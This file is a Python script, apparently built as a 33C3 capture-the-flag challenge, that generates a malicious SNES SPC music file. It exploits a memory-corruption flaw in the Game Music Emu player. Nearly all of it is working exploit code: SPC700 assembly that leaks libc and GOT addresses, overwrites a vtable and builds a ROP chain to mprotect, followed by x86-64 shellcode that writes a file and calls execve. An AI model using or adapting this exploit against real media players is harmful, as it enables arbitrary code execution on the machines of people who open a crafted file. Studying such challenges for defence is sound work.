from asm import disasm, asm
# https://github.com/niklasb/ctf-tools/tree/master/pwnlib
from pwnlib import tools
import random
import string
import struct
import subprocess
import sys

"""
struct header_t
{
    char tag [35];
    byte format;
    byte version;
    byte pc [2];  // pcl, pch  @ 37
    byte a, x, y, psw, sp;
    byte unused [2];
    char song [32];   // @ 46
    char game [32];
    char dumper [16];
    char comment [32];
    byte date [11];
    byte len_secs [3];
    byte fade_msec [4];
    char author [32]; // sometimes first char should be skipped (see official SPC spec)
    byte mute_mask;
    byte emulator;
    byte unused2 [46];
};

struct spc_file_t {
    // [...] header
    uint8_t ram [0x10000];
    uint8_t dsp [128];
    uint8_t unused [0x40];
    uint8_t ipl_rom [0x40];
};
"""

def build(format=0x1a, version=0x1e, pc=0, a=0, x=0, y=0, psw=0, sp=0,
      song='song', game='game', dumper='dumper', comment='comment',
      ram='\0'*0x10000, dsp='\0'*128, ipl_rom='\0'*0x40):
    res = ''
    res += 'SNES-SPC700 Sound File Data v0.30\x1a\x1a'
    res += struct.pack('<BBHBBBBB', format, version, pc, a, x, y, psw, sp)
    res += '\0\0' # unused
    assert len(song) <= 32
    assert len(game) <= 31
    assert len(dumper) <= 15
    assert len(comment) <= 31
    res += song.ljust(32, '\0')
    res += game.ljust(32, '\0')
    res += dumper.ljust(16, '\0')
    res += comment.ljust(32, '\0')
    res += '\0'*11  # date
    res += '817'    # len_secs
    res += '1000'   # fade_msec
    res += '\0'*32  # author
    res += '\0'     # mute_mask
    res += '\x30'   # emulator
    res += '\0'*46  # unused
    assert len(res) == 0x100

    assert len(ram) == 0x10000
    assert len(dsp) == 128
    assert len(ipl_rom) == 0x40
    res += ram
    res += dsp
    res += '\0'*0x40
    res += ipl_rom

    assert len(res) == 0x10200
    return res

def splice(data, pos, update):
    return data[:pos] + update + data[pos+len(update):]

with open('smw/smw-10b.spc') as f:
  smw = f.read()

ram = smw[0x100:0x10100]
dsp = smw[0x10100:0x10180]
ipl_rom = smw[0x101c0:0x10200]
pc, a, x, y, psw, sp = struct.unpack('<HBBBBB', smw[0x25:0x25+7])

old_pc = pc
pc = 0xf100

# libc + 0x41bd5
#    mov     rsp, [rdi+0A0h]
#    mov     rbx, [rdi+80h]
#    mov     rbp, [rdi+78h]
#    mov     r12, [rdi+48h]
#    mov     r13, [rdi+50h]
#    mov     r14, [rdi+58h]
#    mov     r15, [rdi+60h]
#    mov     rcx, [rdi+0A8h]
#    push    rcx
#    mov     rsi, [rdi+70h]
#    mov     rdx, [rdi+88h]
#    mov     rcx, [rdi+98h]
#    mov     r8, [rdi+28h]
#    mov     r9, [rdi+30h]
#    mov     rdi, [rdi+68h]
#    xor     eax, eax
#    retn

def store(addr, bytes):
    res = ''
    for b in bytes:
        res += 'mov X,#%d \n mov %d,X \n' % (b, addr)
        addr += 1
    return res

def store_int(addr, value, bytes=8): # clobbers X
    if value < 0:
        value += 2**(8*bytes)
    res = ''
    for loc in range(addr, addr+bytes):
        res += 'mov X,#%d \n mov %d,X \n' % (value&0xff, loc)
        value >>= 8
    return res

def copy(from_, to, bytes=8):
    res = ''
    for i in range(bytes):
        res += 'mov X,%d \n mov %d,X \n' % (from_+i, to+i)
    return res

def add(a, b, c):
    return store(0, [a&0xff, a>>8, b&0xff, b>>8, c&0xff, c>>8]) + '\n call !add8'

def sub(a, b, c):
    return store(0, [a&0xff, a>>8, b&0xff, b>>8, c&0xff, c>>8]) + '\n call !sub8'

def copy_y(from_, to, sz=8):
    return store(0, [from_&0xff, from_>>8, to&0xff, to>>8, sz]) + '\n call !copy_y'

reg_call_cnt=0
def call_reg(func):
    '''
    Call a function by putting the return address in 0x10+0x11.
    We do this because the stack (0x100-0x200) gets mangled by the Y setup routine.
    '''
    global reg_call_cnt
    reg_call_cnt+=1
    return '''
        mov X,#{after_reg_call_CNT&0xff} \n mov 0x10,X
        mov X,#{after_reg_call_CNT>>8} \n mov 0x11,X
        call !FUNC
    after_reg_call_CNT:
    '''.replace('CNT',str(reg_call_cnt)).replace('FUNC', func)

return_reg_call = '''
    mov X,0x11
    push X
    mov X,0x10
    push X
    ret
    '''

def leak(from_, to):
    return ('mov X,#%d \n mov 0,X \n mov X,#%d \n mov 1,X \n' % (from_, to)
            + call_reg('leak'))

# This implements the exploit described in
# http://scarybeastsecurity.blogspot.de/2016/12/redux-compromising-linux-using-snes.html
# with minor modifications. Our payload is to mprotect() the VRAM so it is executable,
# and then jump to the shellcode towards the end of the input file.


free_got_offset = 0x718   # offset from Spc_Emu vtable to free@got
fread_got_offset = 0x738  # offset from Spc_Emu vtable to fread@got

code = asm('''
    '''+call_reg('setup_y')+'''

    ; copy vtable from Y+0xea7c to 0x20
    '''+copy_y(0xea7c, 0xfe20)+'''

    ; copy ram pointer from Y+0xf954 to 0x28
    '''+copy_y(0xf954, 0xfe28)+'''

    ; compute data_file ptr in 0x30
    '''+store_int(0x40, -4580)+'''
    '''+add(0x28, 0x40, 0x30)+'''

    ; leak data ptr 0x38
    '''+leak(0x30, 0x38)+'''

    ; add song name offset (1)
    '''+store_int(0x40, 46)+'''
    '''+add(0x38, 0x40, 0x30)+'''
    ; leak song name to 0x50 (1)
    '''+leak(0x30, 0xa0)+'''

    ; add song name offset (2)
    '''+store_int(0x40, 8)+'''
    '''+add(0x30, 0x40, 0x30)+'''
    ; leak song name to 0x58 (2)
    '''+leak(0x30, 0xa8)+'''

    ; add song name offset (3)
    '''+store_int(0x40, 8)+'''
    '''+add(0x30, 0x40, 0x30)+'''
    ; leak song name to 0x60 (3)
    '''+leak(0x30, 0xb0)+'''

    ; add song name offset (4)
    '''+store_int(0x40, 8)+'''
    '''+add(0x30, 0x40, 0x30)+'''
    ; leak song name to 0x68 (4)
    '''+leak(0x30, 0xb8)+'''

    ; compute free@got in 0x30
    '''+store_int(0x40, free_got_offset)+'''
    '''+add(0x20, 0x40, 0x30)+'''

    ; leak free address into 0x38
    '''+leak(0x30, 0x38)+'''

    ; compute fread@got in 0x30
    '''+store_int(0x40, fread_got_offset)+'''
    '''+add(0x20, 0x40, 0x30)+'''

    ; leak fread address into 0x30
    '''+leak(0x30, 0x30)+'''

    ; write free - pow to 0x30
    '''+sub(0x38,0x30,0x30)+'''

    '''+add(0x30,0xa0,0xa0)+'''
    '''+add(0xa3,0x30,0xa3)+'''
    '''+add(0x30,0xa6,0xa6)+'''
    '''+add(0xa9,0x30,0xa9)+'''
    '''+add(0x30,0xac,0xac)+'''
    '''+add(0xaf,0x30,0xaf)+'''
    '''+add(0x30,0xb2,0xb2)+'''
    '''+add(0xb5,0x30,0xb5)+'''
    '''+add(0x30,0xb8,0xb8)+'''
    '''+add(0xbb,0x30,0xbb)+'''
    '''+add(0x30,0xbe,0xbe)+'''

    call !check_flag

    ; compute gadget 2 address (offset = 0x41bd5 - 0x7b2f0)
    '''+store_int(0x40, 0x41bd5 - 0x7b2f0)+'''
    '''+add(0x40, 0x38, 0x80)+'''

    ; compute mprotect (offset = 0xe41b0 - 0x7b2f0 = 0x68ec0)
    '''+store_int(0x40, 0xe41b0 - 0x7b2f0)+'''
    '''+add(0x40, 0x38, 0x50)+'''

    ; rip = [rdi+0xa8] = mprotect
    '''+copy_y(0xfe50, 0xeb24, 8)+'''

    ; rdi = [rdi+0x68] = ram & ~0xffff
    '''+copy(0x28, 0x50, 8)+'''
    mov X,#0 \n mov 0x50,X \n mov 0x51,X
    '''+copy_y(0xfe50, 0xeae4, 8)+'''

    ; rsi = [rdi+0x70] = 0x100000
    '''+store_int(0x40, 0x100000)+'''
    '''+copy_y(0xfe40, 0xeaec, 8)+'''

    ; rdx = [rdi+0x88] = 7
    '''+store_int(0x40, 7)+'''
    '''+copy_y(0xfe40, 0xeb04, 8)+'''

    ; rsp = [rdi+0xa0] = ram + 0x70
    '''+store_int(0x40, 0x70)+'''
    '''+add(0x40, 0x28, 0x50)+'''
    '''+copy_y(0xfe50, 0xeb1c, 8)+'''

    ; set return address to RAM + 0xfb00
    '''+store_int(0x40, 0xfb00)+'''
    '''+add(0x40, 0x28, 0x70)+'''

    ; overwrite vtable
    '''+copy_y(0xfe28, 0xea7c, 8)+'''

    call !wait_for_frame

fail:
    stop

check_flag:
    mov A,0xa0
    cmp A,#0x92
    bne fail
    mov A,0xa1
    cmp A,#0x6b
    bne fail
    mov A,0xa2
    cmp A,#0x44
    bne fail
    mov A,0xa3
    cmp A,#0x92
    bne fail
    mov A,0xa4
    cmp A,#0x97
    bne fail
    ret

; 0 = from (8-bit pointer to 64-bit address)
; 1 = to (8-bit pointer to 64-bit address)
; return address in 0x10+0x11
leak:
    ; save arguments
    mov X,0
    mov 8,X
    mov X,1
    mov 9,X

    ; save link "register"
    mov X,0x10
    mov 0x12,X
    mov X,0x11
    mov 0x13,X

    ; overwrite buf_begin
    '''+store(0, [0,0xfe,0x44,0xfb,8])+'''
    mov X,8
    mov 0,X
    call !copy_y

    ; increment free@got copy by 8
    '''+store_int(0x40, 8)+'''
    '''+add(0x30, 0x40, 0x48)+'''

    ; overwrite buf_end
    '''+copy_y(0xfe48, 0xfb4c)+'''

    ; overwrite extra_clocks
    '''+store_int(0x40, -51200, bytes=4)+'''
    '''+copy_y(0xfe40, 0xfb3c, 4)+'''

    ; overwrite dsp_time
    '''+store_int(0x40, 0, bytes=4)+'''
    '''+copy_y(0xfe40, 0xfb1c, 4)+'''

    ; overwrite dsp.out
    '''+store_int(0x40, 0)+'''
    '''+copy_y(0xfe40, 0xf964, 8)+'''

    call !wait_for_frame
    '''+call_reg('setup_y')+'''

    ; read free from extra_buf into result
    '''+store(0, [0x5c,0xfb,0,0xfe,8])+'''
    mov X,9
    mov 2,X
    call !copy_y

    ; restore link register
    mov X,0x12
    mov 0x10,X
    mov X,0x13
    mov 0x11,X

    '''+return_reg_call+'''


wait_for_frame:
    mov X,#0x02
    mov 0,X
    mov X,#0xfe
    mov 1,X
    mov X,#0x41
    mov 2,X
wait_for_frame_loop:
    mov A,[0]+Y
    cmp A,#0x41
    beq wait_for_frame_loop
    ret

; from = 0..1
; to = 2..3
; res = 4..5
add8:
    mov X,#8
    clrc
add_loop:
    push X

    mov X,#0
    mov A,[0+X]
    adc A,[2+X]
    mov [4+X],A
    incw 0
    incw 2
    incw 4

    pop X
    dec X
    bne add_loop
    ret

; from = 0..1
; to = 2..3
; res = 4..5
sub8:
    mov X,#8
    clrc
add_loop_sub:
    push X

    mov X,#0
    mov A,[0+X]
    sbc A,[2+X]
    mov [4+X],A
    incw 0
    incw 2
    incw 4

    pop X
    dec X
    bne add_loop_sub
    ret

; from = 0..1
; to = 2..3
; size = 4
memcpy:
    mov X,4
memcpy_loop:
    push X

    mov X,#0
    mov A,[0+X]
    mov [2+X],A
    incw 0
    incw 2

    pop X
    dec X
    bne memcpy_loop
    ret

; Set y to negative value as described in blog post.
;
; return address in 0x10+0x11
;
; from = 0,1
; to = 2,3
; size = 4
setup_y:
    mov X,#0xff
    mov (X)+,A  ; clobbers 0xff
    mov Y,#0xff
inc_x_loop:
    mov (X)+,A  ; clobbers 0x100-0x1fe
    dec Y
    bne inc_x_loop

    mov A,X
    mov Y,A
    mov (X)+,A ; clobbers 0x1ff
    mov (X)+,A ; clobbers 0x200
    mov A,X
    mul YA

    mov A,Y
    mov X,A
    mov (X)+,A ; clobbers 0x3ff
    mov (X)+,A ; clobbers 0x400
    mov A,X
    mul YA

    mov A,Y
    mov X,A
    mov (X)+,A  ; clobbers 0xfff
    mov (X)+,A  ; clobbers 0x1000
    mov A,X
    mul YA

    mov A,Y
    mov X,A
    mov (X)+,A  ; clobbers 0xffff
    mov (X)+,A  ; clobbers 0x10000 = 0?
    mov A,X
    mul YA

    mov X,A
    mov (X)+,A  ; clobbers 0xff
    mov (X)+,A  ; clobbers 0x100
    div YA,X

    mov A,Y
    mov X,A
    div YA,X

    '''+return_reg_call+'''

copy_y:
    mov X,4
copy_loop:
    ;mov A,!0xea7c+Y
    ;mov !0xff00+Y,A
    mov A,[0]+Y
    mov [2]+Y,A
    incw 0
    incw 2
    dec X
    bne copy_loop
    ret
''', base=pc)

print 'code size before=%d' % len(code)

pad = 0xfb00-pc-len(code)
assert pad >= 0
random.seed(1337)
code += ''.join(random.choice(string.ascii_lowercase) for _ in range(pad))

code += tools.x86_64.assemble('''
    mov rbp, rsp
    sub rbp, 0x78  ; rbp = ram

    mov rdi, 0
    mov rsi, 0x100000
    mov rdx, 3
    mov r10, 34
    mov r8, -1
    mov r9, 0
    mov rax, 9
    syscall
    mov rsp, rax
    add rsp, 0x100000 - 0x100

    mov rax, qword 0x33c300133700c4fe
    push rax
    mov rax, qword 0xb4be00d34d00c0d3
    push rax
    movdqu xmm4, [rsp]

    movdqu xmm1, [rbp+0xa0]
    movdqu xmm2, [rbp+0xb0]

    mov rcx, 42
crypt_loop:
    movdqu xmm3, xmm1
    unpckhpd xmm1, xmm2
    unpcklpd xmm2, xmm3

    pshuflw xmm1, xmm1, 141
    pshuflw xmm2, xmm2, 57

    pshufhw xmm1, xmm1, 210
    pshufhw xmm2, xmm2, 135

    movdqu xmm3, xmm1
    psllq xmm3, 13
    psrlq xmm1, 51
    pxor xmm1, xmm3
    pxor xmm1, xmm4

    movdqu xmm3, xmm2
    psrlq xmm3, 17
    psllq xmm2, 47
    pxor xmm2, xmm3
    pxor xmm2, xmm4
    loop crypt_loop

    mov rax, 0xaf7aea900f7d0218
    push rax
    mov rax, 0x8a76639879e2196c
    push rax
    movdqu xmm4, [rsp]
    pcmpeqq xmm4, xmm1
    pmovmskb eax, xmm4
    cmp eax, 0xffff
    jne fail

    mov rax, 0x74c0a7f29ff2fc80
    push rax
    mov rax, 0xc23662b9aefabdb2
    push rax
    movdqu xmm4, [rsp]
    pcmpeqq xmm4, xmm2
    pmovmskb eax, xmm4
    cmp eax, 0xffff
    jne fail

    ; flag verified, play mario!

    mov r12, [rbp-0x1384+0x1a0]  ; file data ptr
    mov word [r12+37], 0x06c2    ; fix PC

    mov rbx, 0x07e481556c0d539a
    mov rax, '''+str(struct.unpack("<Q","/r12j2x\0")[0]^0x07e481556c0d539a)+'''
    xor rax, rbx
    push rax
    mov rax, '''+str(struct.unpack("<Q","/dev/shm")[0]^0x07e481556c0d539a)+'''
    xor rax, rbx
    push rax
    mov rdi, rsp
    mov rsi, 578    ; O_RDWR | O_CREAT | O_TRUNC
    mov rdx, 0o600
    mov rax, 2      ; sys_open
    syscall
    mov r13, rax

    mov rax, 87     ; sys_unlink
    syscall

    mov rdi, r13  ; fd
    mov rsi, r12  ; file_data
    mov rdx, 0x10200  ; size
    mov rax, 1  ; sys_write
    syscall

    mov rax, r13
    mov rdi, rsp
    mov rsi, rsp
itoa_loop:
    xor rdx, rdx
    mov rcx, 10
    div rcx
    add dl, '0'
    mov [rdi], dl
    inc rdi
    test rax, rax
    jnz itoa_loop

    mov byte [rdi], 0

    dec rdi
reverse_loop:
    mov al, [rdi]
    mov bl, [rsi]
    mov [rdi], bl
    mov [rsi], al
    cmp rdi, rsi
    jl reverse_loop

    mov rbx, 0x07e481556c0d539a
    mov rax, '''+str(struct.unpack("<Q","self/fd/")[0]^0x07e481556c0d539a)+'''
    xor rax, rbx
    push rax
    mov rax, '''+str(struct.unpack("<Q","  /proc/")[0] ^ 0x07e481556c0d539a)+'''
    xor rax, rbx
    push rax
    lea r14, [rsp + 2]  ; r14 = "/proc/self/fd/..."

    ; get envp
    mov rdx, [rbp + 0x38]
    mov rdx, [rdx - 0x7b2f0 + 0x39af18]

    mov rax, '''+str(struct.unpack("<Q","lf/exe\0\0")[0]^0x07e481556c0d539a)+'''
    xor rax, rbx
    push rax
    mov rax, '''+str(struct.unpack("<Q","/proc/se")[0]^0x07e481556c0d539a)+'''
    xor rax, rbx
    push rax
    mov rdi, rsp

    mov rax, '''+str(struct.unpack("<Q","er\0\0\0\0\0\0")[0]^0x07e481556c0d539a)+'''
    xor rax, rbx
    ;push rax   ; note this push was missing :(
    mov rax, '''+str(struct.unpack("<Q","gme_play")[0]^0x07e481556c0d539a)+'''
    xor rax, rbx
    push rax
    mov rsi, rsp

    push 0
    push r14
    push rsi
    mov rsi, rsp

    mov rax, 59  ; sys_execve
    syscall
    mov rax, 60
    syscall

fail:
    push 0x1337
    push 0x1337
    mov rdi, rsp
    mov rsi, 0
    mov rax, 35
    syscall ; nanosleep
    jmp fail

''')

ram = splice(ram, pc, code)

print 'pc=%08x' % pc
print 'code size=%d' % len(code)

game='33C3 CTF'
if len(sys.argv) > 1:
    song=sys.argv[1]
else:
    song='PUT FLAG HERE TO PLAY MUSIC'

data = build(
    pc=pc, a=a, x=x, y=y, psw=psw, sp=sp,
    game=game, song=song,
    ram=ram, dsp=dsp, ipl_rom=ipl_rom)

with open('out.spc', 'wb') as f:
  f.write(data)
